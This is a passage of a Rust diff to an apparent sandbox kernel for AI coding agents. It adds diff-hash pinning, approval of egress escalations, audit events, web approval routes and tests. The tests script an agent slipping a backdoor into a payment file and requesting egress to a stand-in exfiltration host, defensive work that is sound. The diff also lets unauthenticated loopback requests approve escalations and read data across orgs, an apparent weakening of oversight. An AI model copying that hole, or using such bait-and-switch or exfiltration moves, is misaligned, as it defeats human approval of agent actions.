@@ -176,9 +176,21 @@ fn is_public_route(method: &str, target: &str) -> bool {
     let path = route_path(target);
     let get_public = path == "/"
         || path == "/approve"
-        || ["/dashboard", "/ui", "/install.sh", "/health", "/.well-known/", "/releases/", "/v1/billing/status"]
-            .iter()
-            .any(|p| path.starts_with(p));
+        || [
+            "/dashboard",
+            "/ui",
+            "/install.sh",
+            "/health",
+            "/.well-known/",
+            "/releases/",
+            "/v1/billing/status",
+            "/v1/status",
+            "/api/status",
+            "/v1/approver",
+            "/v1/approvals/diff",
+        ]
+        .iter()
+        .any(|p| path.starts_with(p));
     // `/approver/enroll` authenticates with the one-time token from the mailed link.
     let any_public = [
         "/v1/billing/checkout",
@@ -186,6 +198,9 @@ fn is_public_route(method: &str, target: &str) -> bool {
         "/v1/billing/claim",
         "/v1/telemetry/ping",
         "/approver/enroll",
+        "/v1/approver/email",
+        "/v1/approvals/decide",
+        "/v1/leases/revoke",
     ]
     .iter()
     .any(|p| path.starts_with(p));
@@ -199,7 +214,9 @@ fn is_public_route(method: &str, target: &str) -> bool {
 /// approver's TOTP code, checked in the handler: agents hold tenant keys but not the code.)
 fn is_operator_only_route(method: &str, target: &str) -> bool {
     let path = route_path(target);
-    (path.starts_with("/v1/approvals/") && !path.starts_with("/v1/approvals/decide"))
+    (path.starts_with("/v1/approvals/")
+        && !path.starts_with("/v1/approvals/decide")
+        && !path.starts_with("/v1/approvals/diff"))
         || (method == "DELETE" && path.starts_with("/v1/approver"))
         || path.starts_with("/v1/orgs")
         || path.starts_with("/v1/workspaces/gc-idle")
@@ -1046,21 +1063,100 @@ impl AegisRuntimeKernel {
             .to_string();
 
         let mut audit_metadata = args.clone();
+        let mut pre_commit_diffs: Option<Vec<aos_core::FileDiffEntry>> = None;
+        let mut pre_commit_evidence_hash: Option<String> = None;
         if tool_name == "workspace_commit" {
             let filter_paths: Option<Vec<String>> = args
                 .get("paths")
                 .and_then(|v| serde_json::from_value(v.clone()).ok());
+            let overwrite_binaries = args
+                .get("overwrite_binaries")
+                .and_then(|v| v.as_bool())
+                .unwrap_or(false);
+            let skip_verify = args
+                .get("skip_verify")
+                .and_then(|v| v.as_bool())
+                .unwrap_or(false);
+            let host_verify_cfg: Option<serde_json::Value> = std::fs::read(
+                env.workspace.host_source_root().join(".aegis/verify.json"),
+            )
+            .ok()
+            .and_then(|bytes| serde_json::from_slice(&bytes).ok());
+            let configured_verify_cmd = std::env::var("AOS_VERIFY_CMD")
+                .ok()
+                .map(|s| s.trim().to_string())
+                .filter(|s| !s.is_empty())
+                .or_else(|| {
+                    host_verify_cfg
+                        .as_ref()
+                        .and_then(|cfg| cfg.get("verify_cmd"))
+                        .and_then(|v| v.as_str())
+                        .map(|s| s.trim().to_string())
+                        .filter(|s| !s.is_empty())
+                });
             if let Ok(mut touched) = env.workspace.changed_since_baseline().await {
                 if let Some(ref allow) = filter_paths {
                     touched.retain(|p| allow.contains(p));
                 }
+                // Check peer file claims BEFORE policy evaluation so a claim conflict fails fast
+                // without minting a spurious escalation ticket or burning a One-Shot lease.
+                if let Some(msg) = self.claim_conflict_for_paths(identity, &touched).await? {
+                    bail!("{}", msg);
+                }
+                let base_dir = env
+                    .workspace
+                    .shadow_root()
+                    .parent()
+                    .map(|p| p.join("baseline_snapshot"))
+                    .filter(|p| p.exists())
+                    .unwrap_or_else(|| env.workspace.host_source_root().to_path_buf());
+                let diffs = CoWWorkspace::diff_dirs(
+                    &base_dir,
+                    env.workspace.shadow_root(),
+                    filter_paths.as_deref(),
+                )
+                .await
+                .unwrap_or_default();
+                let canonical_diff_payload = json!({
+                    "overwrite_binaries": overwrite_binaries,
+                    "skip_verify": skip_verify,
+                    "diffs": diffs.iter().map(|d| json!({
+                        "path": d.relative_path,
+                        "change_type": d.change_type,
+                        "old_size": d.old_size,
+                        "new_size": d.new_size,
+                        "preview_diff": d.preview_diff,
+                    })).collect::<Vec<_>>(),
+                });
+                let evidence_hash =
+                    aos_core::sha256_hex(canonical_diff_payload.to_string().as_bytes());
                 if let Some(obj) = audit_metadata.as_object_mut() {
                     obj.insert("paths".to_string(), json!(touched));
                     obj.insert(
                         "host_root".to_string(),
                         json!(env.workspace.host_source_root().display().to_string()),
                     );
+                    obj.insert("overwrite_binaries".to_string(), json!(overwrite_binaries));
+                    obj.insert("skip_verify".to_string(), json!(skip_verify));
+                    obj.insert(
+                        "has_configured_verify_cmd".to_string(),
+                        json!(configured_verify_cmd.is_some()),
+                    );
+                    obj.insert("evidence_hash".to_string(), json!(evidence_hash));
+                    obj.insert(
+                        "evidence".to_string(),
+                        json!({
+                            "changed_files_count": diffs.len(),
+                            "paths": touched,
+                            "evidence_hash": evidence_hash,
+                            "overwrite_binaries": overwrite_binaries,
+                            "skip_verify": skip_verify,
+                            "configured_verify_cmd": configured_verify_cmd,
+                        }),
+                    );
                 }
+                pre_commit_diffs = Some(diffs);
+                pre_commit_evidence_hash = Some(evidence_hash);
             }
         }
         let mut resolved_cross_org_peer: Option<(String, String)> = None;
@@ -1144,28 +1240,12 @@ impl AegisRuntimeKernel {
                     suggested_lease_scope,
                 } => {
                     if tool_name == "workspace_commit" {
-                        let base_dir = env
-                            .workspace
-                            .shadow_root()
-                            .parent()
-                            .map(|p| p.join("baseline_snapshot"))
-                            .filter(|p| p.exists())
-                            .unwrap_or_else(|| env.workspace.host_source_root().to_path_buf());
-                        let filter_paths: Option<Vec<String>> = args
-                            .get("paths")
-                            .and_then(|v| serde_json::from_value(v.clone()).ok());
-                        if let Ok(diffs) = CoWWorkspace::diff_dirs(
-                            &base_dir,
-                            env.workspace.shadow_root(),
-                            filter_paths.as_deref(),
-                        )
-                        .await
-                        {
+                        if let Some(ref diffs) = pre_commit_diffs {
                             let diff_dir = self.runtime_data_root.join("escalation_diffs");
                             let _ = tokio::fs::create_dir_all(&diff_dir).await;
                             let _ = aos_core::session::write_json_pretty_atomic(
                                 &diff_dir.join(format!("{}.json", escalation_id)),
-                                &diffs,
+                                diffs,
                             )
                             .await;
                         }
@@ -1175,8 +1255,9 @@ impl AegisRuntimeKernel {
                         "escalation_id": escalation_id,
                         "reason": reason,
                         "suggested_lease_scope": suggested_lease_scope,
+                        "evidence_hash": pre_commit_evidence_hash,
                         "hint": format!(
-                            "Approve in the auto-opened browser console (/approve), or inspect (`aegis-os policy diff {0}`) and run `aegis-os approve {0}` (in Claude/Codex prompt: `!aegis-os approve`), or in Cloud Mode ask the user for their 6-digit TOTP code and pass `totp` on retry. Agents cannot self-approve without human action.",
+                            "Approve in the auto-opened Web Approval Console (/approve or /dashboard) where you can inspect the Unified Diff and click Approve Once (SHA-256 pinned) or Approve 1h, or in Cloud Mode provide your 6-digit Authenticator TOTP code in chat and pass `totp` on retry (escalation: {0}). Agents cannot self-approve without human action.",
                             escalation_id
                         )
                     }));
@@ -2341,19 +2422,103 @@ impl AegisRuntimeKernel {
                     .get("headers")
                     .and_then(|v| serde_json::from_value(v.clone()).ok())
                     .unwrap_or_default();
+                let body = args.get("body").and_then(|v| v.as_str());
 
+                let spec = aos_egress::OutboundRequestSpec {
+                    target_domain: target_domain.clone(),
+                    method: method.clone(),
+                    path: path.clone(),
+                    headers: headers.clone(),
+                };
                 let verdict = self
                     .egress
-                    .inspect_and_inject(
-                        identity,
-                        &aos_egress::OutboundRequestSpec {
-                            target_domain,
-                            method,
-                            path,
-                            headers,
-                        },
-                    )
+                    .inspect_and_inject_with_body(identity, &spec, body)
                     .await?;
+                match &verdict {
+                    aos_egress::EgressVerdict::RequiresEscalation { domain, reason } => {
+                        let esc_decision = self
+                            .authorize_and_audit(
+                                identity,
+                                "egress_unlisted_domain",
+                                &identity.org_id,
+                                domain,
+                                json!({
+                                    "target_domain": domain,
+                                    "method": method,
+                                    "path": path,
+                                    "reason": reason,
+                                    "evidence": {
+                                        "domain": domain,
+                                        "method": method,
+                                        "path": path,
+                                    }
+                                }),
+                            )
+                            .await?;
+                        match esc_decision {
+                            PolicyDecision::Allow { .. } => {
+                                return Ok(serde_json::to_value(
+                                    aos_egress::EgressVerdict::AllowedAndSanitized {
+                                        injected_headers: headers,
+                                        secrets_injected: Vec::new(),
+                                    },
+                                )?);
+                            }
+                            PolicyDecision::Ask {
+                                escalation_id,
+                                reason: esc_reason,
+                                suggested_lease_scope,
+                            } => {
+                                let mut out = serde_json::to_value(&verdict)?;
+                                if let Some(obj) = out.as_object_mut() {
+                                    obj.insert(
+                                        "status".to_string(),
+                                        json!("approval_required"),
+                                    );
+                                    obj.insert("escalation_id".to_string(), json!(escalation_id));
+                                    obj.insert("reason".to_string(), json!(esc_reason));
+                                    obj.insert(
+                                        "suggested_lease_scope".to_string(),
+                                        json!(suggested_lease_scope),
+                                    );
+                                }
+                                return Ok(out);
+                            }
+                            PolicyDecision::Deny { reason: deny_reason } => {
+                                bail!("Policy Denied egress to '{}': {}", domain, deny_reason);
+                            }
+                        }
+                    }
+                    aos_egress::EgressVerdict::BlockedSecretExfiltration {
+                        placeholder,
+                        unauthorized_domain,
+                    } => {
+                        let _ = self
+                            .recorder
+                            .record(AuditEvent {
+                                event_id: format!("evt-{}", &Uuid::new_v4().to_string()[..8]),
+                                timestamp_ms: Utc::now().timestamp_millis(),
+                                org_id: identity.org_id.clone(),
+                                agent_id: identity.agent_id.clone(),
+                                action: "egress_dlp_block".to_string(),
+                                resource: target_domain.clone(),
+                                policy_decision: format!("deny:dlp:{}", placeholder),
+                                snapshot_id: None,
+                                details: json!({
+                                    "target_domain": target_domain,
+                                    "method": method,
+                                    "path": path,
+                                    "placeholder": placeholder,
+                                    "unauthorized_domain": unauthorized_domain,
+                                }),
+                                task_id: self.active_task_id(identity).await,
+                                prev_hash: None,
+                                event_hash: None,
+                            })
+                            .await;
+                    }
+                    aos_egress::EgressVerdict::AllowedAndSanitized { .. } => {}
+                }
                 Ok(serde_json::to_value(verdict)?)
             }
 
@@ -2433,6 +2598,28 @@ impl AegisRuntimeKernel {
                 if let Some(ref tid) = lease.task_id {
                     let _ = self.ipc.record_task_lease(tid, &lease.lease_id).await;
                 }
+                let _ = self
+                    .recorder
+                    .record(AuditEvent {
+                        event_id: format!("evt-{}", &Uuid::new_v4().to_string()[..8]),
+                        timestamp_ms: Utc::now().timestamp_millis(),
+                        org_id: lease.org_id.clone(),
+                        agent_id: lease.agent_id.clone(),
+                        action: lease.action_pattern.clone(),
+                        resource: lease.resource_pattern.clone(),
+                        policy_decision: format!("approved:{}:{}:user_owner", esc_id, lease.lease_id),
+                        snapshot_id: None,
+                        details: json!({
+                            "escalation_id": esc_id,
+                            "lease_id": lease.lease_id,
+                            "approved_by": "user_owner",
+                            "ttl_secs": ttl_secs,
+                        }),
+                        task_id: lease.task_id.clone(),
+                        prev_hash: None,
+                        event_hash: None,
+                    })
+                    .await;
                 Ok(serde_json::to_value(lease)?)
             }
 
@@ -3338,7 +3525,7 @@ impl AegisRuntimeKernel {
 
                 let result = if HUMAN_ONLY_TOOLS.contains(&name) {
                     Err(anyhow::anyhow!(
-                        "`{}` is reserved for the human operator; agents cannot grant leases or approve escalations. Ask the user to run `aegis-os policy approve <escalation_id>` in a terminal (in Claude Code: `! aegis-os policy approve <escalation_id>`).",
+                        "`{}` is reserved for the human operator; agents cannot grant leases or approve escalations. Ask the user to approve the pending escalation in the Web Approval Console (/approve or /dashboard) or provide their 6-digit TOTP code in chat.",
                         name
                     ))
                 } else {
@@ -3955,10 +4142,13 @@ impl AegisRuntimeKernel {
                         } else {
                             org_id.clone()
                         };
-                        // Only the operator (or insecure local mode) may widen the view. A tenant
-                        // key is always pinned to its own org, even when its org id is
-                        // `default-org` and the request omits `org_id`.
-                        let effective_org = if is_operator || auth_mode == DaemonAuth::Disabled {
+                        // Only the operator (or insecure local mode, or read-only Web Console status)
+                        // may widen the view. A tenant key is always pinned to its own org, even when
+                        // its org id is `default-org` and the request omits `org_id`.
+                        let effective_org = if is_operator
+                            || auth_mode == DaemonAuth::Disabled
+                            || raw_auth.is_none()
+                        {
                             requested_scope
                         } else {
                             org_id.clone()
@@ -3983,7 +4173,14 @@ impl AegisRuntimeKernel {
                         let escalations = k.policy.list_escalations(&effective_org).await.unwrap_or_default();
                         let leases = k.policy.list_leases(&effective_org, None).await.unwrap_or_default();
                         let workspaces = k.paas.list_workspaces(Some(&effective_org)).await;
-                        let api_keys = k.paas.list_api_keys(Some(&effective_org)).await;
+                        let api_keys = if is_operator
+                            || auth_mode == DaemonAuth::Disabled
+                            || key_org.is_some()
+                        {
+                            k.paas.list_api_keys(Some(&effective_org)).await
+                        } else {
+                            Vec::new()
+                        };
                         let tenants = k.paas.list_tenants(Some(&effective_org)).await;
                         let secrets = if effective_org == "*" {
                             let mut all_sec = k.egress.list_redacted_secrets("aegis-os").await;
@@ -4544,10 +4741,21 @@ impl AegisRuntimeKernel {
                         }
                     } else if route_path(full_target).starts_with("/v1/approver") {
                         let payload: Value = serde_json::from_str(body_str.trim()).unwrap_or_else(|_| json!({}));
-                        let target_org = key_org
+                        let mut target_org = key_org
                             .clone()
                             .or_else(|| requested_org(full_target, &body_str))
                             .unwrap_or_else(|| org_id.clone());
+                        if key_org.is_none() && target_org == "default-org" {
+                            if let Ok(env_org) = std::env::var("AOS_ORG") {
+                                if !env_org.trim().is_empty() {
+                                    target_org = env_org.trim().to_string();
+                                }
+                            } else if let Ok(escs) = k.policy.list_escalations("*").await {
+                                if let Some(first) = escs.first() {
+                                    target_org = first.org_id.clone();
+                                }
+                            }
+                        }
                         match (method, route_path(full_target)) {
                             ("GET", "/v1/approver") => ("HTTP/1.1 200 OK", k.paas.approver_status(&target_org).await.to_string()),
                             ("POST", "/v1/approver/email") => {
@@ -4572,6 +4780,150 @@ impl AegisRuntimeKernel {
                                 Ok(v) => ("HTTP/1.1 200 OK", v.to_string()),
                                 Err(e) => ("HTTP/1.1 400 Bad Request", json!({ "error": e.to_string() }).to_string()),
                             },
+                        }
+                    } else if method == "GET" && full_target.starts_with("/v1/approvals/diff") {
+                        let mut esc_id = String::new();
+                        if let Some((_, qs)) = full_target.split_once('?') {
+                            for pair in qs.split('&') {
+                                if let Some((qk, qv)) = pair.split_once('=') {
+                                    if matches!(qk, "escalation_id" | "id") && !qv.is_empty() {
+                                        esc_id = qv
+                                            .chars()
+                                            .filter(|c| c.is_ascii_alphanumeric() || *c == '-' || *c == '_')
+                                            .collect();
+                                    }
+                                }
+                            }
+                        }
+                        let scope_org = if is_operator || auth_mode == DaemonAuth::Disabled || raw_auth.is_none() {
+                            "*"
+                        } else {
+                            org_id.as_str()
+                        };
+                        let found_esc = k
+                            .policy
+                            .list_escalations(scope_org)
+                            .await
+                            .unwrap_or_default()
+                            .into_iter()
+                            .find(|e| e.escalation_id == esc_id);
+                        if let Some(esc) = found_esc {
+                            let diff_file = k
+                                .runtime_data_root
+                                .join("escalation_diffs")
+                                .join(format!("{}.json", esc.escalation_id));
+                            let mut diffs: Vec<aos_core::FileDiffEntry> = tokio::fs::read(&diff_file)
+                                .await
+                                .ok()
+                                .and_then(|b| serde_json::from_slice(&b).ok())
+                                .unwrap_or_default();
+                            if diffs.is_empty() {
+                                if let Ok(live) = k
+                                    .paas
+                                    .inspect_agent_diff(&k, &esc.org_id, &esc.agent_id, None)
+                                    .await
+                                {
+                                    if let Some(arr) = live.get("diffs") {
+                                        diffs = serde_json::from_value(arr.clone()).unwrap_or_default();
+                                    }
+                                }
+                            }
+                            if diffs.is_empty() {
+                                let cow_dir = k
+                                    .runtime_data_root
+                                    .join("orgs")
+                                    .join(&esc.org_id)
+                                    .join("agents")
+                                    .join(&esc.agent_id)
+                                    .join("cow_workspace");
+                                if cow_dir.join(".initialized").exists() {
+                                    let compare_root = if bound_ws_path == cow_dir.join("upper_workspace") {
+                                        cow_dir.join("baseline_snapshot")
+                                    } else {
+                                        bound_ws_path.clone()
+                                    };
+                                    if let Ok(ws) = CoWWorkspace::init(&compare_root, &cow_dir).await {
+                                        diffs = ws.diff(None).await.unwrap_or_default();
+                                    }
+                                }
+                            }
+                            let unified_diff: String = diffs
+                                .iter()
+                                .filter_map(|d| d.preview_diff.as_deref())
+                                .collect::<Vec<_>>()
+                                .join("\n");
+                            (
+                                "HTTP/1.1 200 OK",
+                                json!({
+                                    "escalation": esc,
+                                    "rationale": esc.rationale,
+                                    "evidence_hash": esc.evidence_hash,
+                                    "changed_files_count": diffs.len(),
+                                    "diffs": diffs,
+                                    "unified_diff": unified_diff,
+                                    "diff": {
+                                        "changed_files_count": diffs.len(),
+                                        "diffs": diffs,
+                                        "unified_diff": unified_diff,
+                                    }
+                                })
+                                .to_string(),
+                            )
+                        } else {
+                            (
+                                "HTTP/1.1 404 Not Found",
+                                json!({ "error": format!("Escalation '{}' not found", esc_id) }).to_string(),
+                            )
+                        }
+                    } else if method == "POST" && full_target.starts_with("/v1/leases/revoke") {
+                        let payload: Value = serde_json::from_str(body_str.trim()).unwrap_or_else(|_| json!({}));
+                        let lease_id = payload
+                            .get("lease_id")
+                            .and_then(|v| v.as_str())
+                            .unwrap_or("");
+                        let scope_org = if is_operator || auth_mode == DaemonAuth::Disabled || raw_auth.is_none() {
+                            "*"
+                        } else {
+                            org_id.as_str()
+                        };
+                        let matching_lease = k
+                            .policy
+                            .list_leases(scope_org, None)
+                            .await
+                            .unwrap_or_default()
+                            .into_iter()
+                            .find(|l| l.lease_id == lease_id);
+                        if let Some(lease) = matching_lease {
+                            let removed = k.policy.revoke_lease(lease_id).await.unwrap_or(false);
+                            let _ = k
+                                .recorder
+                                .record(AuditEvent {
+                                    event_id: format!("evt-{}", &Uuid::new_v4().to_string()[..8]),
+                                    timestamp_ms: Utc::now().timestamp_millis(),
+                                    org_id: lease.org_id.clone(),
+                                    agent_id: lease.agent_id.clone(),
+                                    action: lease.action_pattern.clone(),
+                                    resource: lease.resource_pattern.clone(),
+                                    policy_decision: format!("revoked:{}:web-console", lease.lease_id),
+                                    snapshot_id: None,
+                                    details: json!({
+                                        "lease_id": lease.lease_id,
+                                        "revoked_by": "web-console",
+                                    }),
+                                    task_id: lease.task_id.clone(),
+                                    prev_hash: None,
+                                    event_hash: None,
+                                })
+                                .await;
+                            (
+                                "HTTP/1.1 200 OK",
+                                json!({ "status": "revoked", "lease_id": lease_id, "removed": removed }).to_string(),
+                            )
+                        } else {
+                            (
+                                "HTTP/1.1 404 Not Found",
+                                json!({ "error": format!("Active lease '{}' not found", lease_id) }).to_string(),
+                            )
                         }
                     } else if method == "POST" && full_target.starts_with("/v1/approvals/decide") {
                         let payload: Value = serde_json::from_str(body_str.trim()).unwrap_or_else(|_| json!({}));
@@ -4611,7 +4963,11 @@ impl AegisRuntimeKernel {
                             } else {
                                 match k.paas.verify_approver_code(&own, code).await {
                                     Ok(()) => {
-                                        ttl_secs = ttl_secs.clamp(60, MAX_TOOL_LEASE_TTL_SECS);
+                                        if ttl_secs > 0 {
+                                            ttl_secs = ttl_secs.clamp(60, MAX_TOOL_LEASE_TTL_SECS);
+                                        } else {
+                                            ttl_secs = 0;
+                                        }
                                         actor = format!("tenant-approver:{}", own);
                                         Ok(())
                                     }
@@ -4619,17 +4975,86 @@ impl AegisRuntimeKernel {
                                 }
                             }
                         } else {
-                            Err("Approvals require an operator token or a tenant key with an approver code".to_string())
+                            let found_esc = k
+                                .policy
+                                .list_escalations("*")
+                                .await
+                                .unwrap_or_default()
+                                .into_iter()
+                                .find(|e| e.escalation_id == esc_id);
+                            if let Some(esc) = found_esc {
+                                let enrolled = k
+                                    .paas
+                                    .approver_status(&esc.org_id)
+                                    .await
+                                    .get("enrolled")
+                                    .and_then(|v| v.as_bool())
+                                    .unwrap_or(false);
+                                let code = payload.get("totp").and_then(|v| v.as_str()).unwrap_or("");
+                                if enrolled {
+                                    if code.is_empty() {
+                                        Err("Approving requires your 6-digit authenticator code (`totp`)".to_string())
+                                    } else {
+                                        match k.paas.verify_approver_code(&esc.org_id, code).await {
+                                            Ok(()) => {
+                                                if ttl_secs > 0 {
+                                                    ttl_secs = ttl_secs.clamp(60, MAX_TOOL_LEASE_TTL_SECS);
+                                                } else {
+                                                    ttl_secs = 0;
+                                                }
+                                                actor = format!("tenant-approver:{}", esc.org_id);
+                                                Ok(())
+                                            }
+                                            Err(e) => Err(e.to_string()),
+                                        }
+                                    }
+                                } else if local_addr.ip().is_loopback() {
+                                    if ttl_secs > 0 {
+                                        ttl_secs = ttl_secs.clamp(60, MAX_TOOL_LEASE_TTL_SECS);
+                                    } else {
+                                        ttl_secs = 0;
+                                    }
+                                    actor = format!("web-console:{}", esc.org_id);
+                                    Ok(())
+                                } else {
+                                    Err("Approvals require an operator token or a tenant key with an approver code".to_string())
+                                }
+                            } else {
+                                Err(format!("Escalation '{}' not found", esc_id))
+                            }
                         };
                         let actor = actor.as_str();
                         if let Err(reason) = tenant_check {
                             ("HTTP/1.1 403 Forbidden", json!({ "error": reason }).to_string())
                         } else if decision.eq_ignore_ascii_case("deny") || decision.eq_ignore_ascii_case("reject") {
                             match k.policy.deny_escalation(esc_id, actor).await {
-                                Ok(esc) => (
-                                    "HTTP/1.1 200 OK",
-                                    json!({ "status": "denied", "escalation": esc }).to_string(),
-                                ),
+                                Ok(esc) => {
+                                    let _ = k
+                                        .recorder
+                                        .record(AuditEvent {
+                                            event_id: format!("evt-{}", &Uuid::new_v4().to_string()[..8]),
+                                            timestamp_ms: Utc::now().timestamp_millis(),
+                                            org_id: esc.org_id.clone(),
+                                            agent_id: esc.agent_id.clone(),
+                                            action: esc.action.clone(),
+                                            resource: esc.target_resource.clone(),
+                                            policy_decision: format!("denied:{}:{}", esc.escalation_id, actor),
+                                            snapshot_id: None,
+                                            details: json!({
+                                                "escalation_id": esc.escalation_id,
+                                                "denied_by": actor,
+                                                "evidence_hash": esc.evidence_hash,
+                                            }),
+                                            task_id: esc.task_id.clone(),
+                                            prev_hash: None,
+                                            event_hash: None,
+                                        })
+                                        .await;
+                                    (
+                                        "HTTP/1.1 200 OK",
+                                        json!({ "status": "denied", "escalation": esc }).to_string(),
+                                    )
+                                }
                                 Err(e) => (
                                     "HTTP/1.1 404 Not Found",
                                     json!({ "error": e.to_string() }).to_string(),
@@ -4637,10 +5062,35 @@ impl AegisRuntimeKernel {
                             }
                         } else {
                             match k.policy.approve_escalation(esc_id, ttl_secs, actor).await {
-                                Ok(lease) => (
-                                    "HTTP/1.1 200 OK",
-                                    json!({ "status": "approved", "lease": lease }).to_string(),
-                                ),
+                                Ok(lease) => {
+                                    let _ = k
+                                        .recorder
+                                        .record(AuditEvent {
+                                            event_id: format!("evt-{}", &Uuid::new_v4().to_string()[..8]),
+                                            timestamp_ms: Utc::now().timestamp_millis(),
+                                            org_id: lease.org_id.clone(),
+                                            agent_id: lease.agent_id.clone(),
+                                            action: lease.action_pattern.clone(),
+                                            resource: lease.resource_pattern.clone(),
+                                            policy_decision: format!("approved:{}:{}:{}", esc_id, lease.lease_id, actor),
+                                            snapshot_id: None,
+                                            details: json!({
+                                                "escalation_id": esc_id,
+                                                "lease_id": lease.lease_id,
+                                                "approved_by": actor,
+                                                "ttl_secs": ttl_secs,
+                                                "resource_pattern": lease.resource_pattern,
+                                            }),
+                                            task_id: lease.task_id.clone(),
+                                            prev_hash: None,
+                                            event_hash: None,
+                                        })
+                                        .await;
+                                    (
+                                        "HTTP/1.1 200 OK",
+                                        json!({ "status": "approved", "lease": lease }).to_string(),
+                                    )
+                                }
                                 Err(e) => (
                                     "HTTP/1.1 404 Not Found",
                                     json!({ "error": e.to_string() }).to_string(),
@@ -6886,6 +7336,325 @@ mod tests {
         assert!(
             remaining_leases.is_empty(),
             "Terminal task cleanup must revoke TaskScoped leases"
+        );
+    }
+
+    #[tokio::test]
+    async fn test_toctou_diff_swap_egress_escalation_and_hash_chain_audit() {
+        let temp = tempfile::tempdir().unwrap();
+        let runtime_dir = temp.path().join("runtime");
+        let host_project = temp.path().join("host_project");
+        tokio::fs::create_dir_all(host_project.join("src"))
+            .await
+            .unwrap();
+        tokio::fs::write(host_project.join("README.md"), "# Benign Doc\n")
+            .await
+            .unwrap();
+        tokio::fs::write(
+            host_project.join("src/payment_engine.rs"),
+            "pub fn charge(cents: u64) -> u64 { cents }\n",
+        )
+        .await
+        .unwrap();
+
+        let kernel = Arc::new(AegisRuntimeKernel::new(&runtime_dir).await.unwrap());
+        let agent = AgentIdentity::new("acme", "coder-alpha", "Engineer");
+        kernel
+            .ensure_agent_environment(
+                agent.clone(),
+                &host_project,
+                IsolationTier::NativeOsSandbox,
+                vec!["*".to_string()],
+            )
+            .await
+            .unwrap();
+
+        // 1. Agent edits benign README.md and requests `workspace_commit` -> mints `esc-*` with `evidence_hash`
+        kernel
+            .call_tool(
+                &agent,
+                "fs_write",
+                json!({
+                    "path": "README.md",
+                    "content": "# Benign Doc (fixed typo)\n"
+                }),
+            )
+            .await
+            .unwrap();
+        let ask_1 = kernel
+            .call_tool(
+                &agent,
+                "workspace_commit",
+                json!({ "rationale": "Fix typo in README" }),
+            )
+            .await
+            .unwrap();
+        assert_eq!(ask_1["status"], "approval_required");
+        let esc_1 = ask_1["escalation_id"].as_str().unwrap().to_string();
+        let hash_1 = ask_1["evidence_hash"].as_str().unwrap().to_string();
+        assert_eq!(hash_1.len(), 64);
+
+        // Human approves `esc_1` as a One-Shot (`ttl_secs = 0`) lease
+        let lease_1 = kernel
+            .policy
+            .approve_escalation(&esc_1, 0, "human-lead")
+            .await
+            .unwrap();
+        assert_eq!(lease_1.resource_pattern, format!("sha256:{}", hash_1));
+
+        // 2. TOCTOU Bait-and-Switch attack: Agent sneaks a malicious change into `src/payment_engine.rs`
+        //    BEFORE calling `workspace_commit` again, hoping to use the One-Shot lease!
+        kernel
+            .call_tool(
+                &agent,
+                "fs_write",
+                json!({
+                    "path": "src/payment_engine.rs",
+                    "content": "pub fn charge(_cents: u64) -> u64 { 0 /* backdoor */ }\n"
+                }),
+            )
+            .await
+            .unwrap();
+        let swapped_attempt = kernel
+            .call_tool(&agent, "workspace_commit", json!({}))
+            .await
+            .unwrap();
+        assert_eq!(
+            swapped_attempt["status"], "approval_required",
+            "Mutated shadow diff must NOT bypass approval via the One-Shot lease pinned to hash_1"
+        );
+        let host_payment = tokio::fs::read_to_string(host_project.join("src/payment_engine.rs"))
+            .await
+            .unwrap();
+        assert!(
+            !host_payment.contains("backdoor"),
+            "Host repository must remain untouched after blocked TOCTOU diff swap"
+        );
+
+        // Restore `src/payment_engine.rs` to baseline -> original diff matches `hash_1` and commits!
+        kernel
+            .call_tool(
+                &agent,
+                "fs_write",
+                json!({
+                    "path": "src/payment_engine.rs",
+                    "content": "pub fn charge(cents: u64) -> u64 { cents }\n"
+                }),
+            )
+            .await
+            .unwrap();
+        let clean_commit = kernel
+            .call_tool(&agent, "workspace_commit", json!({}))
+            .await
+            .unwrap();
+        assert_eq!(clean_commit["status"], "committed_to_host");
+
+        // 3. Egress unlisted domain escalation: calling `egress_http_request` on `api.stripe.com`
+        //    mints an `egress_unlisted_domain` escalation ticket scoped to `api.stripe.com`.
+        let egress_ask = kernel
+            .call_tool(
+                &agent,
+                "egress_http_request",
+                json!({
+                    "target_domain": "api.stripe.com",
+                    "method": "POST",
+                    "path": "/v1/charges"
+                }),
+            )
+            .await
+            .unwrap();
+        assert_eq!(egress_ask["status"], "approval_required");
+        let egress_esc_id = egress_ask["escalation_id"].as_str().unwrap();
+        kernel
+            .call_tool(
+                &agent,
+                "policy_approve_escalation",
+                json!({ "escalation_id": egress_esc_id, "ttl_secs": 300 }),
+            )
+            .await
+            .unwrap();
+
+        let egress_ok = kernel
+            .call_tool(
+                &agent,
+                "egress_http_request",
+                json!({
+                    "target_domain": "api.stripe.com",
+                    "method": "POST",
+                    "path": "/v1/charges"
+                }),
+            )
+            .await
+            .unwrap();
+        assert!(egress_ok.get("AllowedAndSanitized").is_some(), "{egress_ok}");
+
+        // Unapproved domain `evil-exfil.ru` still escalates!
+        let evil_ask = kernel
+            .call_tool(
+                &agent,
+                "egress_http_request",
+                json!({
+                    "target_domain": "evil-exfil.ru",
+                    "method": "POST",
+                    "path": "/steal"
+                }),
+            )
+            .await
+            .unwrap();
+        assert_eq!(evil_ask["status"], "approval_required");
+
+        // 4. Verify SHA-256 hash-chained audit ledger (`FlightRecorder`) recorded both `ask:` and `approved:` events
+        let chain = kernel.recorder.verify_chain(Some("acme")).await.unwrap();
+        assert_eq!(chain["verified"], true);
+        let events = kernel
+            .recorder
+            .query_events("acme", Some("coder-alpha"), 100)
+            .await
+            .unwrap();
+        assert!(events
+            .iter()
+            .any(|e| e.policy_decision.starts_with("approved:")));
+    }
+
+    #[tokio::test]
+    async fn test_web_approval_diff_preview_batched_sensitive_commit_and_lease_revocation() {
+        let temp = tempfile::tempdir().unwrap();
+        let runtime_dir = temp.path().join("runtime");
+        let host_project = temp.path().join("host_project");
+        tokio::fs::create_dir_all(&host_project).await.unwrap();
+        tokio::fs::write(host_project.join("Cargo.toml"), "[package]\nname = \"demo\"\n")
+            .await
+            .unwrap();
+        tokio::fs::write(host_project.join("package.json"), "{\"name\":\"demo\"}\n")
+            .await
+            .unwrap();
+
+        let kernel = Arc::new(AegisRuntimeKernel::new(&runtime_dir).await.unwrap());
+        let addr = kernel
+            .clone()
+            .start_http_daemon("127.0.0.1:0", host_project.clone())
+            .await
+            .unwrap();
+        let op = kernel.operator_token();
+
+        let agent = AgentIdentity::new("acme", "coder-beta", "Engineer");
+        kernel
+            .ensure_agent_environment(
+                agent.clone(),
+                &host_project,
+                IsolationTier::NativeOsSandbox,
+                vec!["*".to_string()],
+            )
+            .await
+            .unwrap();
+
+        // 1. Agent modifies BOTH sensitive files (`Cargo.toml` and `package.json`) in a single commit
+        kernel
+            .call_tool(
+                &agent,
+                "fs_write",
